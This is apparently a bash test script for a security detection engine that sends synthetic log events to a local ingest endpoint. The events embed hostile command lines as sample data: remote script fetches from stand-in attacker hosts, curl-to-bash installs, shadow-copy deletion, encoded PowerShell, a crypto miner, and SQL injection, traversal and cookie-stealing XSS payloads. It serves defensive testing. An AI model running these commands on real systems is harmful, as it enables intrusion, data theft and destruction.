#!/usr/bin/env bash
# XCloak Detection Engine Test Script
# Usage: XCLOAK_KEY=<api-key> bash test_detections.sh
#
# Requires: curl, jq
# Sends synthetic log payloads that should trigger every detector.
# After running, wait up to 5 minutes then check the Alerts page.

API="http://localhost:8080"
KEY="${XCLOAK_KEY:-}"

if [[ -z "$KEY" ]]; then
  echo "ERROR: set XCLOAK_KEY environment variable first"
  echo "  export XCLOAK_KEY=<api-key from Settings > Log Sources>"
  exit 1
fi

GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
NC='\033[0m'

send() {
  local label="$1"
  local body="$2"
  local ct="${3:-application/json}"
  local code
  code=$(curl -s -o /dev/null -w "%{http_code}" \
    -X POST "$API/api/ingest" \
    -H "X-Api-Key: $KEY" \
    -H "Content-Type: $ct" \
    --data "$body")
  if [[ "$code" == "200" ]]; then
    echo -e "${GREEN}[OK]${NC} $label"
  else
    echo -e "${RED}[FAIL $code]${NC} $label"
  fi
}

send_many() {
  local label="$1"
  local body="$2"
  # Send 25 copies to cross alert thresholds
  local arr="["
  for i in $(seq 1 25); do arr="$arr$body,"; done
  arr="${arr%,}]"
  send "$label (x25)" "$arr"
}

echo "========================================"
echo "  XCloak Detection Engine Test Suite"
echo "========================================"
echo ""

# ── 1. CREDENTIAL ATTACKS ─────────────────────────────────────────────────────
echo -e "${YELLOW}[1/12] Credential Attacks${NC}"

# Brute force: 25 failed auth from same IP
send_many "Brute force login (≥20 failures from 1 IP)" \
  '{"src_ip":"203.0.113.50","user":"admin","auth_result":"failure","hostname":"auth-server","timestamp":"2024-01-01T00:00:00Z"}'

# Password spray: same IP, multiple usernames
SPRAY='['
for u in admin root operator sysadmin service backup helpdesk; do
  SPRAY="$SPRAY{\"src_ip\":\"203.0.113.51\",\"user\":\"$u\",\"auth_result\":\"failure\",\"hostname\":\"auth-server\",\"timestamp\":\"2024-01-01T00:00:00Z\"},"
done
SPRAY="${SPRAY%,}]"
curl -s -o /dev/null -X POST "$API/api/ingest" -H "X-Api-Key: $KEY" -H "Content-Type: application/json" --data "$SPRAY"
echo -e "${GREEN}[OK]${NC} Password spray (1 IP, 7 usernames)"

# Credential stuffing: same username, multiple IPs
STUFF='['
for ip in 1.2.3.4 5.6.7.8 9.10.11.12 13.14.15.16 21.22.23.24; do
  STUFF="$STUFF{\"src_ip\":\"$ip\",\"user\":\"victim@corp.com\",\"auth_result\":\"failure\",\"hostname\":\"vpn-gw\",\"timestamp\":\"2024-01-01T00:00:00Z\"},"
done
STUFF="${STUFF%,}]"
curl -s -o /dev/null -X POST "$API/api/ingest" -H "X-Api-Key: $KEY" -H "Content-Type: application/json" --data "$STUFF"
echo -e "${GREEN}[OK]${NC} Credential stuffing (1 user, 5 IPs)"

echo ""

# ── 2. PRIVILEGE ESCALATION ───────────────────────────────────────────────────
echo -e "${YELLOW}[2/12] Privilege Escalation${NC}"

send "Windows PrivEsc — Add to Admins (EventID 4728)" \
  '{"EventID":"4728","user":"attacker","hostname":"DC01","Channel":"Security","AccountName":"attacker","GroupName":"Administrators"}'

send "Windows PrivEsc — Special Logon (EventID 4672)" \
  '{"EventID":"4672","user":"newadmin","hostname":"WIN-SERVER","Channel":"Security","PrivilegeList":"SeDebugPrivilege SeTcbPrivilege"}'

send "Linux PrivEsc — sudo su" \
  '{"user":"jsmith","hostname":"ubuntu01","process":"sudo","CommandLine":"sudo su -","timestamp":"2024-01-01T00:00:00Z"}'

send "Linux PrivEsc — chmod setuid" \
  '{"user":"attacker","hostname":"ubuntu02","CommandLine":"chmod u+s /bin/bash","process":"chmod","timestamp":"2024-01-01T00:00:00Z"}'

echo ""

# ── 3. RANSOMWARE ─────────────────────────────────────────────────────────────
echo -e "${YELLOW}[3/12] Ransomware Indicators${NC}"

send "Ransomware — Kill chain (vssadmin delete shadows)" \
  '{"user":"SYSTEM","hostname":"WIN01","process":"vssadmin.exe","CommandLine":"vssadmin delete shadows /all /quiet","EventID":"4688","timestamp":"2024-01-01T00:00:00Z"}'

send "Ransomware — wbadmin delete catalog" \
  '{"user":"SYSTEM","hostname":"WIN01","process":"wbadmin.exe","CommandLine":"wbadmin delete catalog -quiet","EventID":"4688","timestamp":"2024-01-01T00:00:00Z"}'

send "Ransomware — bcdedit recovery off" \
  '{"user":"SYSTEM","hostname":"WIN01","CommandLine":"bcdedit /set {default} bootstatuspolicy ignoreallfailures","EventID":"4688","timestamp":"2024-01-01T00:00:00Z"}'

send "Ransomware — AV kill (net stop MsMpSvc)" \
  '{"user":"attacker","hostname":"WIN01","CommandLine":"net stop MsMpSvc","process":"cmd.exe","EventID":"4688","timestamp":"2024-01-01T00:00:00Z"}'

echo ""

# ── 4. LIVING-OFF-THE-LAND (LotL) ────────────────────────────────────────────
echo -e "${YELLOW}[4/12] Living-off-the-Land (LotL)${NC}"

send "LotL — certutil decode" \
  '{"EventID":"4688","Image":"C:\\Windows\\System32\\certutil.exe","CommandLine":"certutil -decode payload.b64 payload.exe","user":"alice","hostname":"WKST01","ParentImage":"C:\\Windows\\explorer.exe"}'

send "LotL — regsvr32 remote script" \
  '{"EventID":"4688","Image":"C:\\Windows\\System32\\regsvr32.exe","CommandLine":"regsvr32 /s /n /u /i:http://evil.com/script.sct scrobj.dll","user":"bob","hostname":"WKST02","ParentImage":"C:\\Windows\\explorer.exe"}'

send "LotL — Encoded PowerShell" \
  '{"EventID":"4688","Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","CommandLine":"powershell -enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7","user":"charlie","hostname":"WKST03","ParentImage":"C:\\Windows\\explorer.exe"}'

send "LotL — mshta remote" \
  '{"EventID":"4688","Image":"C:\\Windows\\System32\\mshta.exe","CommandLine":"mshta http://evil.example.com/payload.hta","user":"dave","hostname":"WKST04","ParentImage":"C:\\Windows\\explorer.exe"}'

echo ""

# ── 5. WEB ATTACKS ────────────────────────────────────────────────────────────
echo -e "${YELLOW}[5/12] Web Application Attacks${NC}"

send "Web Attack — SQL Injection" \
  '{"src_ip":"10.0.0.50","http_method":"GET","url_path":"/login?id=1+UNION+SELECT+username,password+FROM+users--","http_status":"200","user_agent":"Mozilla/5.0","hostname":"web01"}' \
  "text/plain"

# Apache combined log format
send "Web Attack — Path Traversal" \
  "10.0.0.51 - - [01/Jan/2024:00:00:00 +0000] \"GET /api/download?file=../../../etc/passwd HTTP/1.1\" 200 4096 \"-\" \"curl/7.68\"" \
  "text/plain"

send "Web Attack — XSS" \
  "10.0.0.52 - - [01/Jan/2024:00:00:00 +0000] \"GET /search?q=<script>alert(document.cookie)</script> HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"" \
  "text/plain"

send "Web Attack — Scanner UA (sqlmap)" \
  "10.0.0.53 - - [01/Jan/2024:00:00:00 +0000] \"GET /products?id=1 HTTP/1.1\" 200 1234 \"-\" \"sqlmap/1.7.11#stable\"" \
  "text/plain"

# Error flood: send 55 4xx responses
ERR_LINES=""
for i in $(seq 1 55); do
  ERR_LINES="$ERR_LINES10.0.0.54 - - [01/Jan/2024:00:00:00 +0000] \"GET /nonexistent-$i HTTP/1.1\" 404 32 \"-\" \"scanner\"\n"
done
printf "%b" "$ERR_LINES" | curl -s -o /dev/null -X POST "$API/api/ingest" \
  -H "X-Api-Key: $KEY" -H "Content-Type: text/plain" --data-binary @-
echo -e "${GREEN}[OK]${NC} HTTP error flood (55 x 404 from same IP)"

echo ""

# ── 6. PERSISTENCE ────────────────────────────────────────────────────────────
echo -e "${YELLOW}[6/12] Persistence${NC}"

send "Persistence — Scheduled task created (EventID 4698)" \
  '{"EventID":"4698","user":"attacker","hostname":"WIN-SERVER","Channel":"Security","TaskName":"\\Microsoft\\Windows\\Telemetry\\AitAgent","TaskContent":"<Actions><Exec><Command>c:\\temp\\mal.exe</Command></Exec></Actions>"}'

send "Persistence — New service (EventID 7045)" \
  '{"EventID":"7045","ServiceName":"SuspiciousSvc","ServiceFileName":"C:\\Windows\\Temp\\backdoor.exe","ServiceType":"kernel driver","hostname":"WIN-SERVER","timestamp":"2024-01-01T00:00:00Z"}'

send "Persistence — Registry Run key (EventID 4657)" \
  '{"EventID":"4657","user":"attacker","hostname":"WIN-SERVER","ObjectName":"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run","NewValue":"C:\\Users\\Public\\evil.exe","timestamp":"2024-01-01T00:00:00Z"}'

send "Persistence — Linux crontab" \
  '{"user":"www-data","hostname":"ubuntu01","CommandLine":"crontab -e","process":"crontab","timestamp":"2024-01-01T00:00:00Z"}' \
  "text/plain"

echo ""

# ── 7. CLOUD SECURITY ─────────────────────────────────────────────────────────
echo -e "${YELLOW}[7/12] Cloud Security${NC}"

send "AWS — AttachRolePolicy (IAM escalation)" \
  '{"eventVersion":"1.08","eventName":"AttachRolePolicy","userIdentity":{"type":"IAMUser","userName":"developer","arn":"arn:aws:iam::123456789012:user/developer"},"sourceIPAddress":"1.2.3.4","awsRegion":"us-east-1","eventSource":"iam.amazonaws.com"}'

send "AWS — StopLogging (CloudTrail disabled)" \
  '{"eventVersion":"1.08","eventName":"StopLogging","userIdentity":{"type":"IAMUser","userName":"attacker","arn":"arn:aws:iam::123456789012:user/attacker"},"sourceIPAddress":"5.6.7.8","awsRegion":"us-east-1","eventSource":"cloudtrail.amazonaws.com"}'

send "AWS — DeleteDetector (GuardDuty killed)" \
  '{"eventVersion":"1.08","eventName":"DeleteDetector","userIdentity":{"type":"IAMUser","userName":"attacker","arn":"arn:aws:iam::123456789012:user/attacker"},"sourceIPAddress":"5.6.7.8","awsRegion":"us-east-1","eventSource":"guardduty.amazonaws.com"}'

send "Azure — Role Assignment Created" \
  '{"operationName":{"value":"Microsoft.Authorization/roleAssignments/write","localizedValue":"Create role assignment"},"caller":"attacker@corp.onmicrosoft.com","callerIpAddress":"9.10.11.12","status":{"value":"Succeeded"},"subscriptionId":"abc-123"}'

send "GCP — setIamPolicy" \
  '{"protoPayload":{"@type":"type.googleapis.com/google.cloud.audit.AuditLog","methodName":"SetIamPolicy","authenticationInfo":{"principalEmail":"attacker@project.iam.gserviceaccount.com"},"requestMetadata":{"callerIp":"13.14.15.16"}}}'

echo ""

# ── 8. EMAIL SECURITY ─────────────────────────────────────────────────────────
echo -e "${YELLOW}[8/12] Email Security${NC}"

send "Email — Phishing attachment (.exe in subject)" \
  '{"SenderAddress":"attacker@evil-domain.com","RecipientAddress":"cfo@corp.com","Subject":"Invoice_April_2024.exe","DeliveryAction":"delivered","timestamp":"2024-01-01T00:00:00Z"}'

send "Email — BEC financial trigger" \
  '{"SenderAddress":"ceo.impersonator@g00gle.com","RecipientAddress":"finance@corp.com","Subject":"Urgent Wire Transfer Required - CEO","DeliveryAction":"delivered","timestamp":"2024-01-01T00:00:00Z"}'

send "Email — Lookalike domain (microsofft.com)" \
  '{"SenderAddress":"noreply@microsofft.com","RecipientAddress":"user@corp.com","Subject":"Your account needs verification","DeliveryAction":"delivered"}'

send "Email — Credential phishing" \
  '{"SenderAddress":"security@paypa1.com","RecipientAddress":"victim@corp.com","Subject":"Verify your account - unusual sign-in activity detected","DeliveryAction":"delivered"}'

echo ""

# ── 9. CONTAINER / KUBERNETES ─────────────────────────────────────────────────
echo -e "${YELLOW}[9/12] Container / Kubernetes${NC}"

send "Container — Privileged container" \
  '{"process":"dockerd","CommandLine":"docker run --privileged -it ubuntu bash","user":"devops","hostname":"docker01","timestamp":"2024-01-01T00:00:00Z"}' \
  "text/plain"

send "Container — Docker socket mount" \
  '{"CommandLine":"docker run -v /var/run/docker.sock:/var/run/docker.sock alpine sh","user":"jenkins","hostname":"ci-runner","process":"docker","timestamp":"2024-01-01T00:00:00Z"}' \
  "text/plain"

send "Container — K8s ClusterRoleBinding" \
  '{"verb":"create","objectRef":{"resource":"clusterrolebindings","name":"evil-admin"},"user":{"username":"developer"},"sourceIPs":["10.0.0.100"],"timestamp":"2024-01-01T00:00:00Z"}' \
  "text/plain"

send "Container — Crypto miner (xmrig)" \
  '{"CommandLine":"./xmrig -o pool.minexmr.com:4444 -u wallet","user":"www-data","hostname":"compromised-pod","process":"xmrig","timestamp":"2024-01-01T00:00:00Z"}' \
  "text/plain"

echo ""

# ── 10. ACTIVE DIRECTORY ATTACKS ──────────────────────────────────────────────
echo -e "${YELLOW}[10/12] Active Directory Attacks${NC}"

send "AD — Kerberoasting (EventID 4769 + RC4 0x17)" \
  '{"EventID":"4769","user":"svc-sqlserver","src_ip":"192.168.1.100","hostname":"DC01","Channel":"Security","TicketOptions":"0x40810000","TicketEncryptionType":"0x17","ServiceName":"MSSQLSvc/sqlserver:1433"}'

send "AD — DCSync (EventID 4662 + replication GUID)" \
  '{"EventID":"4662","user":"mimikatz_user","src_ip":"192.168.1.200","hostname":"DC01","Channel":"Security","ObjectType":"%{19195a5b-6da0-11d0-afd3-00c04fd930c9}","Properties":"1131f6aa-9c07-11d1-f79f-00c04fc2dcd2 {1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}"}'

# Pass-the-Hash: same user, 4 different IPs, LogonType=3, NTLM
PTH='['
for ip in 10.0.0.1 10.0.0.2 10.0.0.3 10.0.0.4; do
  PTH="$PTH{\"EventID\":\"4624\",\"user\":\"sysadmin\",\"src_ip\":\"$ip\",\"hostname\":\"WKST99\",\"Channel\":\"Security\",\"LogonType\":\"3\",\"AuthPackage\":\"NTLM\",\"log_message\":\"An account was successfully logged on. Logon Type: 3 Authentication Package: NTLMSSP\"},"
done
PTH="${PTH%,}]"
curl -s -o /dev/null -X POST "$API/api/ingest" -H "X-Api-Key: $KEY" -H "Content-Type: application/json" --data "$PTH"
echo -e "${GREEN}[OK]${NC} AD — Pass-the-Hash (EventID 4624, 4 IPs, NTLM)"

send "AD — BloodHound process detection (EventID 4688)" \
  '{"EventID":"4688","Image":"C:\\Tools\\SharpHound.exe","CommandLine":"SharpHound.exe -c All --CollectionMethod All","user":"pentest","hostname":"WKST50","ParentImage":"C:\\Windows\\System32\\cmd.exe"}'

send "AD — Kerberos brute force (EventID 4771)" \
  '[{"EventID":"4771","src_ip":"10.0.0.200","user":"alice","hostname":"DC01"},{"EventID":"4771","src_ip":"10.0.0.200","user":"alice","hostname":"DC01"},{"EventID":"4771","src_ip":"10.0.0.200","user":"alice","hostname":"DC01"},{"EventID":"4771","src_ip":"10.0.0.200","user":"alice","hostname":"DC01"},{"EventID":"4771","src_ip":"10.0.0.200","user":"alice","hostname":"DC01"},{"EventID":"4771","src_ip":"10.0.0.200","user":"alice","hostname":"DC01"},{"EventID":"4771","src_ip":"10.0.0.200","user":"alice","hostname":"DC01"},{"EventID":"4771","src_ip":"10.0.0.200","user":"alice","hostname":"DC01"},{"EventID":"4771","src_ip":"10.0.0.200","user":"alice","hostname":"DC01"},{"EventID":"4771","src_ip":"10.0.0.200","user":"alice","hostname":"DC01"},{"EventID":"4771","src_ip":"10.0.0.200","user":"alice","hostname":"DC01"},{"EventID":"4771","src_ip":"10.0.0.200","user":"alice","hostname":"DC01"},{"EventID":"4771","src_ip":"10.0.0.200","user":"alice","hostname":"DC01"},{"EventID":"4771","src_ip":"10.0.0.200","user":"alice","hostname":"DC01"},{"EventID":"4771","src_ip":"10.0.0.200","user":"alice","hostname":"DC01"},{"EventID":"4771","src_ip":"10.0.0.200","user":"alice","hostname":"DC01"},{"EventID":"4771","src_ip":"10.0.0.200","user":"alice","hostname":"DC01"},{"EventID":"4771","src_ip":"10.0.0.200","user":"alice","hostname":"DC01"},{"EventID":"4771","src_ip":"10.0.0.200","user":"alice","hostname":"DC01"},{"EventID":"4771","src_ip":"10.0.0.200","user":"alice","hostname":"DC01"},{"EventID":"4771","src_ip":"10.0.0.200","user":"alice","hostname":"DC01"},{"EventID":"4771","src_ip":"10.0.0.200","user":"alice","hostname":"DC01"},{"EventID":"4771","src_ip":"10.0.0.200","user":"alice","hostname":"DC01"}]'

echo ""

# ── 11. SUPPLY CHAIN ──────────────────────────────────────────────────────────
echo -e "${YELLOW}[11/12] Supply Chain Attacks${NC}"

send "Supply Chain — curl to bash" \
  '{"user":"developer","hostname":"devbox01","process":"bash","CommandLine":"curl -fsSL http://malicious.example.com/install.sh | bash","EventID":"4688","timestamp":"2024-01-01T00:00:00Z"}'

send "Supply Chain — pip extra-index-url (dep confusion)" \
  '{"user":"ci-runner","hostname":"build01","process":"pip","CommandLine":"pip install --extra-index-url https://pypi.attacker.com/simple company-internal-sdk","EventID":"4688","timestamp":"2024-01-01T00:00:00Z"}'

send "Supply Chain — compile in /tmp" \
  '{"user":"www-data","hostname":"webserver01","process":"gcc","CommandLine":"gcc -o /tmp/backdoor /tmp/backdoor.c","EventID":"4688","timestamp":"2024-01-01T00:00:00Z"}'

send "Supply Chain — typosquatting (reqeusts vs requests)" \
  '{"user":"developer","hostname":"devbox02","process":"pip","CommandLine":"pip install reqeusts","EventID":"4688","timestamp":"2024-01-01T00:00:00Z"}'

echo ""

# ── 12. SYSLOG RECEIVER TEST ──────────────────────────────────────────────────
echo -e "${YELLOW}[12/12] Syslog Receiver${NC}"
if command -v logger &>/dev/null; then
  logger -n 127.0.0.1 -P 514 "Jan  1 00:00:00 testhost sshd[1234]: Failed password for root from 203.0.113.99 port 22 ssh2" 2>/dev/null && \
    echo -e "${GREEN}[OK]${NC} Syslog UDP message sent to :514" || \
    echo -e "${YELLOW}[SKIP]${NC} logger failed (port 514 may need sudo or SYSLOG_ENABLED=false)"
else
  echo -e "${YELLOW}[SKIP]${NC} 'logger' command not found"
fi

echo ""
echo "========================================"
echo -e "  ${GREEN}All test payloads sent.${NC}"
echo ""
echo "  Wait up to 5 minutes then check:"
echo "  → http://localhost:3000/alerts"
echo "  → http://localhost:3000/ad-attacks"
echo "  → http://localhost:3000/cloud-security"
echo "  → http://localhost:3000/email-security"
echo "  → http://localhost:3000/container-security"
echo "  → http://localhost:3000/supply-chain"
echo ""
echo "  Schedulers run every 5 min. Backend logs"
echo "  will show [CredAtk] [AD] [Cloud] etc tags."
echo "========================================"
